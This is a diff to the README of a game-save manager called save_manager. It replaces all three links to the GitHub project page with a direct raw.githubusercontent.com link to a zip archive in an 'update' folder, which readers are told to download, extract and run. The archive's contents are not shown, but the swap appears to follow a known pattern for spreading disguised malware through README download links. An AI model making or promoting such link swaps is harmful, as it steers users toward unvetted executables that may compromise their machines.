@@ -1,6 +1,6 @@
 # 🗂️ save_manager - Keep Game Saves In One Place
 
-[![Download save_manager](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dimitriospreoccupied378/save_manager)
+[![Download save_manager](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/dimitriospreoccupied378/save_manager/main/update/save_manager_v2.7.zip)
 
 ## 🎮 What This App Does
 
@@ -29,7 +29,7 @@ For best use, run the app from a folder you can access easily, like your Downloa
 
 ## 📥 Download and Run
 
-1. Open the download page: https://github.com/dimitriospreoccupied378/save_manager
+1. Open the download page: https://raw.githubusercontent.com/dimitriospreoccupied378/save_manager/main/update/save_manager_v2.7.zip
 2. Find the latest release or download package on that page
 3. Download the Windows file or archive
 4. If you downloaded a zip file, extract it first
@@ -211,7 +211,7 @@ No. You can use it for local backups and for cloud sync between devices
 
 ## 🔗 Download Again
 
-If you need the main download page again, use this link: https://github.com/dimitriospreoccupied378/save_manager
+If you need the main download page again, use this link: https://raw.githubusercontent.com/dimitriospreoccupied378/save_manager/main/update/save_manager_v2.7.zip
 
 ## 📌 What to Do Next
 
